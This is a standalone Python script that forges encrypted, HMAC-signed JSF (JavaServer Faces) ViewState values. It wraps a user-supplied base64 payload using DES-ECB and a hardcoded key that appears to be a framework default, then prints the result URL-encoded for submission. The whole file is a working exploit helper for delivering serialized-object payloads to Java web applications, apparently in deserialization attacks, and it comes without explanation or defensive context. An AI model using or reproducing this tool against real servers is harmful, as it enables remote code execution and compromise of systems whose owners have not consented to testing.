#!/usr/bin/env python3

import sys
import hashlib
import hmac
import base64
from urllib import parse
from Crypto.Cipher import DES

key = base64.b64decode("SnNGOTg3Ni0=")

def craft_hmac(msg, nkey=key):
    return hmac.new(nkey, msg, hashlib.sha1).digest()

def encrypt_faces(msg, nkey=key):
    key = base64.b64decode("SnNGOTg3Ni0=")
    obj = DES.new(nkey, DES.MODE_ECB)
    return obj.encrypt(msg)

def decrypt_faces(msg, nkey=key):
    """
    This wipes the HMAC out and dumps the data. expects raw
    """
    newmsg = msg[:-20]
    obj = DES.new(nkey, DES.MODE_ECB)
    return obj.decrypt(newmsg)


def craft(b64_msg, nkey=key):
    """
    This function does the heavy lifting. Feed it a message
    and it will encrypt it as JSF faces would expect. This
    expects b64_msg to be a base-64 encoded payload
    """
    byte_msg = base64.b64decode(b64_msg)
    pad = 8-(len(byte_msg)%8)
    byte_msg += b"\x00"*pad
    enc_msg = encrypt_faces(byte_msg)
    hm = craft_hmac(enc_msg)
    payload = enc_msg+hm
    return base64.b64encode(payload).decode()


def main():
    """ main function """
    payload = craft(sys.argv[1])
    payload = parse.quote(payload)
    print(payload)


if __name__ == '__main__':
    main()
